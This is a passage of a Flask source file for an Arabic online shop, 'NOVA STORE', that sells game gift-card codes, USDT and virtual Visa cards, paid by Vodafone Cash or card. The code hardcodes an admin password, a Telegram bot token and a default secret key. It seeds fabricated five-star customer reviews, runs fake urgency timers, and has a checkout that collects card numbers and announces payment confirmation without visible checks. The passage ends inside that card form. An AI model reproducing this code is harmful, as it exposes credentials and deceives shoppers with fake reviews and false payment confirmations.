import os
import json
import time
import secrets
import sqlite3
import math
import requests

from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask import (
    Flask,
    render_template_string,
    request,
    session,
    redirect,
    url_for,
    make_response,
    jsonify,
    send_from_directory,
    Response,
)

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "nova_store_secret_key")

UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
AVATARS_FOLDER = os.path.join(app.root_path, 'static', 'avatars')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(AVATARS_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['AVATARS_FOLDER'] = AVATARS_FOLDER

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "moh99zzhvni893fj7@gmail.com")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "mohammedaaa222")
DATABASE_PATH = os.environ.get("DATABASE_PATH", "nova_store.db")

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8377094717:AAEb-H7GhAZ7qBcKXDtg6QLehJRlN5264-4")
ADMIN_TELEGRAM_USERNAME = "Mido_M9do"
TELEGRAM_BOT_USERNAME = "midoassistantAIbot"
TELEGRAM_CHANNEL_LINK = "https://t.me/Midomsn"


def get_db():
    connection = sqlite3.connect(DATABASE_PATH)
    connection.row_factory = sqlite3.Row
    return connection


def init_db():
    with get_db() as db:
        db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                email TEXT NOT NULL UNIQUE,
                password_hash TEXT NOT NULL,
                telegram_id TEXT NOT NULL,
                balance REAL NOT NULL DEFAULT 0.0,
                verified INTEGER NOT NULL DEFAULT 0,
                avatar TEXT DEFAULT '🤖',
                status_title TEXT DEFAULT 'عضو مميز',
                ref_code TEXT UNIQUE,
                referred_by TEXT,
                last_spin_date TEXT,
                spin_count INTEGER DEFAULT 0,
                total_orders INTEGER DEFAULT 0,
                created_at INTEGER NOT NULL
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS email_codes (
                email TEXT PRIMARY KEY,
                code TEXT NOT NULL,
                expires_at INTEGER NOT NULL
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                description TEXT NOT NULL,
                price_val REAL NOT NULL,
                price TEXT NOT NULL,
                code TEXT NOT NULL,
                icon TEXT NOT NULL,
                image_url TEXT DEFAULT '',
                category TEXT NOT NULL,
                color TEXT NOT NULL,
                badge TEXT
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS promo_codes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT UNIQUE NOT NULL,
                discount_percent REAL NOT NULL,
                active INTEGER DEFAULT 1
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS posts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                content TEXT NOT NULL,
                image_url TEXT DEFAULT '',
                link_url TEXT DEFAULT '',
                created_at INTEGER NOT NULL
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS reviews (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_name TEXT NOT NULL,
                rating INTEGER NOT NULL,
                comment TEXT NOT NULL,
                created_at INTEGER NOT NULL
            )
        """)

        db.execute("""
            CREATE TABLE IF NOT EXISTS store_settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        """)

        db.execute("INSERT OR IGNORE INTO store_settings (key, value) VALUES ('flash_msg', 'عروض الساعات المحدودة! خصومات خاصة تنتهي قريباً')")
        db.execute("INSERT OR IGNORE INTO store_settings (key, value) VALUES ('vodafone_number', '01000000000')")

        admin_user = db.execute("SELECT id FROM users WHERE email = ?", (ADMIN_EMAIL,)).fetchone()
        if not admin_user:
            db.execute("""
                INSERT INTO users (name, email, password_hash, telegram_id, balance, verified, avatar, status_title, ref_code, created_at)
                VALUES (?, ?, ?, ?, 999999.0, 1, '👑', 'المطور الرئيسي', 'ADMINREF', ?)
            """, ("المطور (ADMIN)", ADMIN_EMAIL, generate_password_hash(ADMIN_PASSWORD), "000000", int(time.time())))
        else:
            db.execute("""
                UPDATE users SET password_hash = ?, verified = 1 WHERE email = ?
            """, (generate_password_hash(ADMIN_PASSWORD), ADMIN_EMAIL))

        cursor = db.execute("SELECT COUNT(*) as count FROM products")
        if cursor.fetchone()["count"] == 0:
            default_products = [
                ("كود جوجل بلاي (10$)", "الولايات المتحدة", 500.00, "500 جـ", "GPLAY-9876", "▶", "", "بطاقات الألعاب", "#35eaa1", "عروض سريعة 🔥"),
                ("كود بلايستيشن (20$)", "الولايات المتحدة", 1000.00, "1000 جـ", "PSN-5432", "PS", "", "بطاقات الألعاب", "#62a0ff", "مميز"),
                ("كود إكس بوكس (25$)", "الولايات المتحدة", 1250.00, "1250 جـ", "XBOX-3344", "ⓧ", "", "بطاقات الألعاب", "#5dff9c", None),
                ("كود ستيم (20$)", "الولايات المتحدة", 1000.00, "1000 جـ", "STEAM-1122", "◉", "", "بطاقات الألعاب", "#9bb8ff", "عرض خاص"),
                ("كود آيتونز (15$)", "الولايات المتحدة", 750.00, "750 جـ", "ITUNES-7788", "", "", "بطاقات الهدايا", "#ffc107", None),
                ("شحن ببجي 660 شدة", "شحن فوري عن طريق الايدي", 350.00, "350 جـ", "PUBG-660", "🎮", "", "ألعاب", "#ff3b3b", "شائع 🔥"),
                ("10 دولار USDT (TRC20)", "تحويل فوري لمحفظتك الرقمية", 500.00, "500 جـ", "USDT-10", "🪙", "", "عملات رقمية ودولارات", "#facc15", "جديد 🔥"),
                ("بطاقة فيزا وهمية $10 (كارت افتراضي)", "صالحة لتفعيل الحسابات للشراء أونلاين", 550.00, "550 جـ", "VISA-10", "💳", "", "بطاقات الدفع", "#38bdf8", "الأكثر طلباً"),
            ]
            db.executemany("""
                INSERT INTO products (name, description, price_val, price, code, icon, image_url, category, color, badge)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, default_products)

        cursor_rev = db.execute("SELECT COUNT(*) as count FROM reviews")
        if cursor_rev.fetchone()["count"] == 0:
            default_reviews = [
                ("أحمد مصطفى", 5, "متجر ممتاز جداً والتسليم فور تسليم التحويل أنصح بالتعامل معه 🔥", int(time.time())),
                ("محمود علي", 5, "مصداقية عالية وسرعة في الشحن شكراً للمطور!", int(time.time())),
            ]
            db.executemany("INSERT INTO reviews (user_name, rating, comment, created_at) VALUES (?, ?, ?, ?)", default_reviews)

        db.execute("INSERT OR IGNORE INTO promo_codes (code, discount_percent) VALUES ('MIDO2026', 10.0)")


init_db()


def send_telegram_code(chat_id, code):
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": f"🔐 كود التحقق الخاص بك في متجر NOVA STORE هو: {code}\nصالح لمدة 5 دقائق فقط."
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass


def get_products():
    with get_db() as db:
        rows = db.execute("SELECT * FROM products").fetchall()
        return [dict(row) for row in rows]


def get_reviews():
    with get_db() as db:
        rows = db.execute("SELECT * FROM reviews ORDER BY id DESC LIMIT 6").fetchall()
        return [dict(row) for row in rows]


def get_posts():
    with get_db() as db:
        rows = db.execute("SELECT * FROM posts ORDER BY id DESC").fetchall()
        return [dict(row) for row in rows]


def get_promo_codes():
    with get_db() as db:
        rows = db.execute("SELECT * FROM promo_codes ORDER BY id DESC").fetchall()
        return [dict(row) for row in rows]


def get_setting(key, default=""):
    with get_db() as db:
        row = db.execute("SELECT value FROM store_settings WHERE key = ?", (key,)).fetchone()
        return row["value"] if row else default


# ==================== القالب الرئيسي للمتجر ====================
PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-site-verification" content="-cqasmgepuPXVxFHJ53UtVgI4DdfCiGR_MbwjVIVv0M" />
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#03091b">

<!-- تخصيص اسم وشعار الموقع لمحركات البحث -->
<title>NOVA STORE | المتجر الرقمي الشامل لبطاقات الألعاب والدفع</title>
<meta name="description" content="متجر NOVA STORE هو متجرك الرقمي الأول لشحن بطاقات جوجل بلاي، بلايستيشن، إكس بوكس، العملات الرقمية وبطاقات الفيزا والدفع عبر فودافون كاش.">
<meta property="og:site_name" content="NOVA STORE">
<meta property="og:title" content="NOVA STORE | المتجر الرقمي الشامل">
<meta property="og:description" content="متجر NOVA STORE لشحن الألعاب والبطاقات الرقمية والدفع الآمن.">
<meta property="og:image" content="/logo.svg">
<meta name="application-name" content="NOVA STORE">

<link rel="icon" type="image/svg+xml" href="/logo.svg">
<link rel="apple-touch-icon" href="/logo.svg">

<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap');
:root{--bg:#03091b;--panel:#07132c;--text:#f4f7ff;--blue:#315dff;--purple:#8d38ff;--border:#1b315c}
*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 70% 0%,#10133e 0,transparent 36%),var(--bg);color:var(--text);font-family:'Cairo',sans-serif}
.topbar{min-height:78px;display:flex;align-items:center;gap:20px;padding:12px 4%;border-bottom:1px solid #18284a;position:sticky;top:0;background:#040a1bed;backdrop-filter:blur(16px);z-index:10}
.brand{display:flex;align-items:center;gap:10px;font-size:24px;font-weight:800;text-decoration:none;color:white}.brand b{color:#754bff}.brand-mark{width:39px;height:39px;display:grid;place-items:center;font-size:33px;background:linear-gradient(140deg,#bc5bff,#276bff);color:white;clip-path:polygon(0 0,75% 0,100% 20%,100% 100%,27% 100%,0 78%)}
.search{height:44px;max-width:420px;flex:1;display:flex;align-items:center;gap:10px;border:1px solid #263d70;border-radius:30px;padding:0 17px;background:#09132b}
.search input{width:100%;border:0;outline:0;background:transparent;color:white;font-size:13px}
.header-actions{display:flex;align-items:center;gap:10px;margin-right:auto}
.user-profile-badge {display: flex; align-items: center; gap: 10px; background: #0b1734; border: 1px solid #315dff; padding: 6px 14px; border-radius: 30px; text-decoration: none; box-shadow: 0 0 10px rgba(49,93,255,0.3);}
.user-avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, #9b37ff, #315dff); display: grid; place-items: center; font-weight: bold; color: white; border: 2px solid #35eaa1; box-shadow: 0 0 8px #35eaa188; overflow:hidden;}

.nav {
  min-height: 58px;
  padding: 0 4%;
  display: flex;
  align-items: center;
  gap: 12px;
  border-bottom: 1px solid #1a2d54;
  background: linear-gradient(180deg, #07122b 0%, #040a1b 100%);
  overflow-x: auto;
  scrollbar-width: none;
}
.nav::-webkit-scrollbar { display: none; }

.nav a {
  color: #c4cde3;
  text-decoration: none;
  padding: 8px 16px;
  border-radius: 12px;
  font-size: 12.5px;
  font-weight: 600;
  transition: all 0.25s ease;
  white-space: nowrap;
  display: flex;
  align-items: center;
  gap: 8px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.nav a:hover {
  background: rgba(49, 93, 255, 0.15);
  border-color: #315dff;
  color: #ffffff;
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(49, 93, 255, 0.2);
}

.nav a.active {
  background: linear-gradient(110deg, #9b37ff, #315dff);
  color: #ffffff;
  border-color: transparent;
  box-shadow: 0 4px 15px rgba(155, 55, 255, 0.35);
}

.nav-badge-spin {
  background: linear-gradient(135deg, #f59e0b, #d97706) !important;
  color: #fff !important;
  border: none !important;
  font-weight: bold;
}
.nav-badge-dev { border-color: #38bdf8 !important; color: #38bdf8 !important; }
.nav-badge-tele { border-color: #a855f7 !important; color: #c084fc !important; }

.admin-badge { background: #570f0f; color: #ff7777; border: 1px solid #ff5555; padding: 6px 14px; border-radius: 12px; font-weight: bold; text-decoration:none;}

.layout{display:grid;grid-template-columns:300px minmax(0,1fr);gap:22px;padding:22px 4%}
@media (max-width:850px){ .layout{grid-template-columns:1fr;} }
.main-column{min-width:0}

.hero{min-height:280px;border:1px solid #263f77;border-radius:22px;overflow:hidden;display:grid;grid-template-columns:1fr 1fr;position:relative;background:radial-gradient(ellipse at 70% 50%,#351174 0,transparent 50%),linear-gradient(110deg,#06102b,#080c2c 65%,#100a3b);padding:25px;align-items:center;}
.hero h1{font-size:clamp(20px,2vw,28px);line-height:1.6;margin:0 0 10px;font-weight:800}
.hero p{color:#c4cce2;font-size:12px;line-height:1.8;margin:0 0 15px}
.hero-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 22px;border-radius:30px;font-size:12px;background:linear-gradient(110deg,#9b37ff,#315dff);color:white;text-decoration:none;font-weight:bold;cursor:pointer;}
.trust-row{display:flex;gap:15px;margin-top:15px;color:#dce5ff;font-size:10px}
.hero-art{position:relative;height:220px;display:flex;align-items:center;justify-content:center}
.gift-card{position:absolute;width:90px;height:125px;border:1px solid #66bfff;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;font-size:11px;background:linear-gradient(145deg,#063c9e,#09132e);box-shadow:0 0 20px #168dff55;}
.gift-card.google{right:45%;transform:rotate(-12deg);background:linear-gradient(145deg,#113e83,#11153c);border-color:#35eaa1}
.gift-card.playstation{right:28%;top:20px;transform:rotate(6deg);background:linear-gradient(145deg,#0759dd,#111342)}
.gift-card.steam{right:10%;top:30px;transform:rotate(12deg);background:linear-gradient(125deg,#122b54,#050c1c)}

.personal-deal-box {
  background: linear-gradient(135deg, #1e0938, #0a1128);
  border: 1px solid #a855f7;
  border-radius: 16px;
  padding: 14px 20px;
  margin-bottom: 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  box-shadow: 0 4px 20px rgba(168, 85, 247, 0.25);
}
.deal-timer {
  background: #03091b;
  color: #f43f5e;
  border: 1px solid #f43f5e;
  font-weight: 800;
  padding: 5px 12px;
  border-radius: 8px;
  font-size: 13px;
}

.categories{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:10px;margin:20px 0}
.category{border:1px solid #172d53;border-radius:12px;background:linear-gradient(150deg,#07152e,#050d20);padding:14px 8px;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:6px;cursor:pointer;transition:0.2s}
.category:hover{border-color:#5a54ff;transform:translateY(-2px)}
.category span{font-size:22px;color:#65baff}
.category b{font-size:11px}

.section-heading{display:flex;align-items:center;justify-content:space-between;margin:25px 0 12px}
.section-heading h2{font-size:18px;margin:0;display:flex;align-items:center;gap:8px}
.product-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
.product-card{border:1px solid #1b3159;background:linear-gradient(150deg,#08152e,#050c1e);border-radius:14px;padding:12px;position:relative;transition:0.2s}
.product-card:hover{border-color:#5c52ff;transform:translateY(-3px)}
.product-visual{height:120px;border-radius:10px;background:radial-gradient(circle at 50% 20%,#1b3159,transparent 70%),#07142c;display:flex;align-items:center;justify-content:center;font-size:36px;position:relative;margin-bottom:10px;overflow:hidden;}
.product-img{width:100%;height:100%;object-fit:cover;border-radius:10px;}
.badge-tag{position:absolute;top:8px;right:8px;background:#ff3b3b;color:white;font-size:9px;padding:2px 8px;border-radius:6px;font-weight:bold;z-index:2;}
.badge-tag.memo{background:#315dff}
.product-card h3{font-size:13px;margin:5px 0 2px;}
.product-card p{font-size:10px;color:#8fa1c4;margin:0 0 10px}
.price-row{display:flex;align-items:center;justify-content:space-between;margin-top:8px}
.price{font-size:13.5px;font-weight:800;color:#35eaa1}
.old-price{font-size:11px;color:#8fa1c4;text-decoration:line-through;margin-left:5px;}
.add-btn{padding:7px 12px;border:0;border-radius:8px;background:linear-gradient(100deg,#933aff,#315dff);font-size:11px;font-weight:700;color:white;cursor:pointer}

.sidebar-left{display:flex;flex-direction:column;gap:18px;}
.side-card{border:1px solid #243e75;border-radius:18px;padding:16px;background:linear-gradient(155deg,#081735,#060d22);}
.side-card h4{margin:0 0 10px;font-size:13px;color:#fff;display:flex;align-items:center;gap:8px;}
.wallet-box{background:linear-gradient(135deg,#0e234e,#180b3d);border:1px solid #35eaa166;border-radius:14px;padding:14px;text-align:center;}

.posts-feed {display:flex;flex-direction:column;gap:15px;margin-bottom:25px;}
.post-card {background:linear-gradient(145deg,#0b1938,#07122b);border:1px solid #315dff;border-radius:16px;padding:16px;box-shadow:0 4px 20px rgba(49,93,255,0.15);}
.post-card h3 {margin:0 0 8px;font-size:15px;color:#38bdf8;display:flex;align-items:center;gap:8px;}
.post-card p {font-size:12px;color:#cbd5e1;line-height:1.7;margin:0 0 10px;}
.post-card img {width:100%;max-height:260px;object-fit:cover;border-radius:12px;margin-bottom:10px;border:1px solid #1f3a70;}

.reviews-grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:15px;}
.review-card {background:#071635;border:1px solid #1e3a6e;padding:12px;border-radius:12px;}

.flash-box{background:linear-gradient(135deg,#5e0a0a,#2b0808);border:1px solid #ff3b3b;border-radius:14px;padding:12px;margin-bottom:15px;display:flex;align-items:center;justify-content:space-between;}
.timer{font-size:14px;font-weight:bold;color:#facc15;background:#03091b;padding:4px 10px;border-radius:8px;}

.promo-input-group{display:flex;gap:6px;margin-top:8px;}
.promo-input-group input{flex:1;padding:8px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#fff;font-size:11px;}
.promo-input-group button{padding:8px 12px;background:#315dff;color:#fff;border:0;border-radius:8px;font-weight:bold;cursor:pointer;font-size:11px;}

.checkout-modal{display:none;position:fixed;inset:0;background:rgba(3,9,27,0.85);backdrop-filter:blur(8px);z-index:200;place-items:center;padding:20px;overflow-y:auto;}
.checkout-box{background:linear-gradient(145deg,#07132c,#0a1a3f);border:1px solid #315dff;border-radius:18px;padding:25px;width:100%;max-width:420px;text-align:center;max-height:90vh;overflow-y:auto;}
.checkout-box h3{margin-top:0;color:#fff;}
.vodafone-card{background:#e11d48;color:white;padding:12px;border-radius:10px;margin:12px 0;font-weight:bold;font-size:13px;}

.payment-tabs {display:flex;gap:8px;margin:12px 0;}
.pay-tab {flex:1;padding:8px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#a8b7d8;font-size:11px;font-weight:bold;cursor:pointer;}
.pay-tab.active {border-color:#35eaa1;background:#0d2340;color:#35eaa1;}

.success-box {display:none;background:linear-gradient(135deg,#064e3b,#022c22);border:1px solid #35eaa1;border-radius:12px;padding:15px;margin-bottom:15px;text-align:center;}

footer{border-top:1px solid #192b4e;padding:30px 4%;display:grid;grid-template-columns:1.5fr 1fr 1fr 1.2fr;gap:25px;color:#aab9d8;font-size:11px;margin-top:40px;background:#030714}
footer h4{color:#f4f7ff;margin:0 0 12px;font-size:13px;border-right:3px solid #315dff;padding-right:8px;}
footer a{display:block;margin:6px 0;color:#aab8d0;text-decoration:none;transition:0.2s;}
footer a:hover{color:#38bdf8;}
.footer-dev-btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:10px;background:linear-gradient(110deg,#9b37ff,#315dff);color:white;font-weight:bold;border-radius:10px;text-decoration:none;font-size:11.5px;box-shadow:0 4px 15px rgba(49,93,255,0.3);transition:0.2s;margin-top:6px;}
.footer-dev-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(155,55,255,0.5);}
.footer-link-box{display:flex;flex-direction:column;gap:8px;margin-top:8px;}
.footer-btn-item{display:flex;align-items:center;gap:8px;padding:8px 12px;background:#091632;border:1px solid #1c3563;border-radius:8px;color:#e2ebf8;text-decoration:none;font-size:11px;transition:0.2s;}
.footer-btn-item:hover{border-color:#38bdf8;background:#0e2047;color:#fff;}
</style>
</head>
<body>

<header class="topbar">
  <a class="brand" href="/"><span class="brand-mark">N</span><span>NOVA <b>STORE</b></span></a>
  <label class="search"><span>⌕</span><input id="searchInput" type="search" placeholder="ابحث عن أي منتج..." onkeyup="filterProducts()"></label>
  <div class="header-actions">
    {% if is_admin %}
      <a href="/admin" class="admin-badge">⚙️ لوحة المطور</a>
    {% endif %}
    {% if user %}
      <a href="/account" class="user-profile-badge">
        <div class="user-avatar">
          {% if user["avatar"].startswith('http') or user["avatar"].startswith('/') %}
            <img src="{{ user['avatar'] }}" style="width:100%;height:100%;object-fit:cover;">
          {% else %}
            {{ user["avatar"] }}
          {% endif %}
        </div>
        <div>
          <span style="font-size:11px;font-weight:bold;display:block;">{{ user["name"] }}</span>
          <span style="font-size:9px;color:#35eaa1;">{{ user["status_title"] }} | {{ user["balance"] }} جـ</span>
        </div>
      </a>
    {% else %}
      <a href="/login" style="color:#d8e2ff;text-decoration:none;font-size:12px;">تسجيل الدخول</a>
      <a href="/register" style="padding:8px 14px;background:linear-gradient(110deg,#9b37ff,#315dff);border-radius:10px;font-weight:bold;color:white;text-decoration:none;font-size:12px;">إنشاء حساب</a>
    {% endif %}
  </div> 
</header>

<nav class="nav">
  <a href="/" class="active">
    <span>🏠</span> الرئيسية
  </a>
  <a href="/spin" class="nav-badge-spin">
    <span>🎡</span> عجلة الحظ اليومية
  </a>
  <a href="https://t.me/{{ admin_telegram }}" target="_blank" class="nav-badge-dev">
    <span>💬</span> الدعم والمطور
  </a>
  <a href="{{ telegram_channel }}" target="_blank" class="nav-badge-tele">
    <span>📢</span> القناة الرسمية
  </a>
  <a href="#reviews">
    <span>⭐️</span> تقييمات العملاء
  </a>
  <a href="/account">
    <span>👤</span> حسابي والمركز
  </a>
</nav>

<main class="layout">
  <aside class="sidebar-left">
    <div class="side-card" style="border-color: #35eaa1; background: linear-gradient(135deg, #071f3d, #030d24);">
      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <span style="font-size: 24px;">📱</span>
        <div>
          <h4 style="margin: 0; color: #fff;">تطبيق NOVA STORE</h4>
          <span style="font-size: 9px; color: #35eaa1;">تصفح أسرع وإشعارات فورية</span>
        </div>
      </div>
      <p style="font-size: 10px; color: #a8b7d8; margin: 0 0 10px;">اضغط أسفله لتثبيت التطبيق مباشرة على شاشة هاتفك!</p>
      <button id="pwaInstallBtn" onclick="installApp()" style="width:100%; padding: 10px; background: linear-gradient(110deg, #35eaa1, #00b894); color: #03091b; font-weight: bold; border-radius: 8px; border:0; cursor:pointer; font-size: 11px;">
        📲 تثبيت التطبيق على الهاتف
      </button>
    </div>

    <div class="side-card" style="border-color:#facc15;">
      <h4>⭐ رأيك يهمنا في المتجر</h4>
      <p style="font-size:10px;color:#a8b7d8;margin:0 0 10px;">شاركنا رأيك لزيادة ثقة العملاء واحصل على دعم فوري!</p>
      <button onclick="openReviewModal()" style="width:100%;padding:9px;background:linear-gradient(110deg,#f59e0b,#d97706);color:white;font-weight:bold;border-radius:8px;border:0;cursor:pointer;font-size:11px;">✍️ إضافة تقييم للخدمة</button>
    </div>

    <div class="side-card">
      <h4>💳 محفظتك الرقمية</h4>
      <div class="wallet-box">
        <span style="font-size:11px;color:#a8b7d8;">الرصيد المتاح</span>
        <h2 style="margin:5px 0;color:#35eaa1;">{% if user %}{{ user["balance"] }}{% else %}0.0{% endif %} جـ</h2>
        <a href="https://t.me/{{ admin_telegram }}?text=أريد%20شحن%20رصيد%20محفظتي%20في%20المتجر" target="_blank" style="display:inline-block;margin-top:8px;padding:6px 14px;background:linear-gradient(110deg,#35eaa1,#00b894);color:#03091b;font-weight:bold;font-size:10px;border-radius:6px;text-decoration:none;">＋ شحن الرصيد</a>
      </div>
    </div>

    <div class="side-card">
      <h4>🏷️ هل لديك كود خصم؟</h4>
      <div class="promo-input-group">
        <input id="promoCodeInput" placeholder="أدخل كود الخصم">
        <button onclick="applyPromo()">تطبيق</button>
      </div>
      <small id="promoMsg" style="display:block;margin-top:6px;font-size:10px;"></small>
    </div>
  </aside>

  <section class="main-column">
    <div class="flash-box">
      <div style="display:flex;align-items:center;gap:8px;">
        <span style="font-size:20px;">⚡</span>
        <div>
          <b style="font-size:12px;color:#fff;display:block;">{{ flash_msg }}</b>
        </div>
      </div>
      <div class="timer" id="flashTimer">02:45:18</div>
    </div>

    <div class="personal-deal-box">
      <div style="display:flex;align-items:center;gap:12px;">
        <span style="font-size:28px;">🎁</span>
        <div>
          <b style="color:#c084fc;font-size:13px;display:block;">عرض مخصص لك حصرياً!</b>
          <span style="font-size:11px;color:#cbd5e1;">احصل على خصم 10% على أي بطاقة عبر كود <b style="color:#facc15;">MIDO2026</b></span>
        </div>
      </div>
      <div class="deal-timer" id="personalTimer">19:59</div>
    </div>

    <div class="hero">
      <div>
        <span style="color:#bca0ff;font-size:11px;font-weight:bold;">عالمك الرقمي الأول</span>
        <h1>شحن بطاقات وأكواد الألعاب بأفضل الأسعار والتسليم الفوري!</h1>
        <p>اختر منتجك المفضل واشترِ الآن باستخدام فودافون كاش أو بطاقة الائتمان.</p>
        <a class="hero-btn" href="#products">تسوق الآن ←</a>
        <div class="trust-row"><span>♧ دفع آمن 100%</span><span>◷ تسليم سريع</span><span>دعم 24/7</span></div>
      </div>
      <div class="hero-art">
        <div class="gift-card google"><span style="color:#35eaa1;font-size:26px;">▶</span><b>Google Play</b></div>
        <div class="gift-card playstation"><span style="color:#62a0ff;font-size:22px;">PSN</span><b>PlayStation</b></div>
        <div class="gift-card steam"><span style="color:#9bb8ff;font-size:22px;">◉</span><b>STEAM</b></div>
      </div>
    </div>

    {% if posts %}
    <div style="margin-top:25px;">
      <div class="section-heading">
        <h2><span>📢</span> أخبار وإعلانات المطور المباشرة</h2>
      </div>
      <div class="posts-feed">
        {% for post in posts %}
        <div class="post-card">
          <h3>👑 {{ post['title'] }}</h3>
          <p>{{ post['content'] }}</p>
          {% if post['image_url'] %}
            <img src="{{ post['image_url'] }}" alt="Post image">
          {% endif %}
          {% if post['link_url'] %}
            <a href="{{ post['link_url'] }}" target="_blank" style="display:inline-block;padding:6px 14px;background:#315dff;color:#fff;border-radius:8px;font-size:11px;font-weight:bold;text-decoration:none;">🔗 اضغط هنا للانتقال للرابط المرفق</a>
          {% endif %}
        </div>
        {% endfor %}
      </div>
    </div>
    {% endif %}

    <div class="categories">
      <div class="category" onclick="filterCat('الكل')"><span>▦</span><b>الكل</b></div>
      <div class="category" onclick="filterCat('بطاقات الألعاب')"><span style="color:#35eaa1;">▶</span><b>بطاقات الألعاب</b></div>
      <div class="category" onclick="filterCat('بطاقات الهدايا')"><span style="color:#bc5bff;">🎁</span><b>بطاقات الهدايا</b></div>
      <div class="category" onclick="filterCat('ألعاب')"><span style="color:#ff3b3b;">🎮</span><b>الألعاب والشحن</b></div>
      <div class="category" onclick="filterCat('عملات رقمية ودولارات')"><span style="color:#facc15;">🪙</span><b>عملات رقمية ودولارات</b></div>
      <div class="category" onclick="filterCat('بطاقات الدفع')"><span style="color:#38bdf8;">💳</span><b>بطاقات الدفع</b></div>
    </div>

    <div class="section-heading" id="products">
      <h2><span>🔥</span> أحدث المنتجات</h2>
    </div>

    <div class="product-grid" id="productGrid"></div>

    <div style="margin-top:40px;" id="reviews">
      <div class="section-heading">
        <h2><span>⭐️</span> آراء وتقييمات العملاء (ثقة وأمان)</h2>
      </div>
      <div class="reviews-grid">
        {% for r in reviews %}
        <div class="review-card">
          <div style="color:#facc15;font-size:12px;margin-bottom:4px;">
            {% for i in range(r['rating']) %}★{% endfor %}
          </div>
          <b style="font-size:12px;color:#fff;display:block;">{{ r['user_name'] }}</b>
          <p style="font-size:11px;color:#a8b7d8;margin:5px 0 0;">"{{ r['comment'] }}"</p>
        </div>
        {% endfor %}
      </div>
    </div>
  </section>
</main>

<div class="checkout-modal" id="checkoutModal">
  <div class="checkout-box">
    <h3 id="modalProdName">شراء المنتج</h3>
    <p style="font-size:12px;color:#a8b7d8;" id="modalProdDesc"></p>
    
    <div class="payment-tabs">
      <button class="pay-tab active" onclick="switchPayMethod('vodafone')">📱 فودافون كاش</button>
      <button class="pay-tab" onclick="switchPayMethod('card')">💳 فيزا / ماستر كارد</button>
    </div>

    <div class="success-box" id="successBox">
      <span style="font-size:26px;">🎉</span>
      <b style="display:block;color:#35eaa1;font-size:13px;margin:5px 0;">تم استلام الطلب وتأكيد عملية الدفع بنجاح!</b>
      <p style="font-size:11px;color:#cbd5e1;margin:0 0 10px;">جاري مراجعة الطلب وتسليم الكود. تواصل مع المطور لاستلام كودك فوراً.</p>
      <a id="devContactBtn" target="_blank" style="display:inline-block;padding:8px 16px;background:#35eaa1;color:#03091b;font-weight:bold;border-radius:8px;text-decoration:none;font-size:11px;">💬 التواصل مع المطور فوراً</a>
    </div>

    <!-- قسم فودافون كاش -->
    <div id="vodafoneSection">
      <div class="vodafone-card">
        📲 رقم تحويل فودافون كاش:<br>
        <span style="font-size:18px;letter-spacing:1px;">{{ vodafone_number }}</span>
      </div>
    </div>

    <!-- قسم بطاقة الائتمان -->
    <div id="cardSection" style="display:none;text-align:right;background:#03091b;padding:12px;border-radius:10px;margin-bottom:12px;">
      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">اسم حامل البطاقة:</label>
      <input id="cardHolderName" placeholder="مثال: Ahmed Mohamed" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;margin-bottom:8px;">

      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">رقم البطاقة (16 رقم):</label>
      <input id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;margin-bottom:8px;">

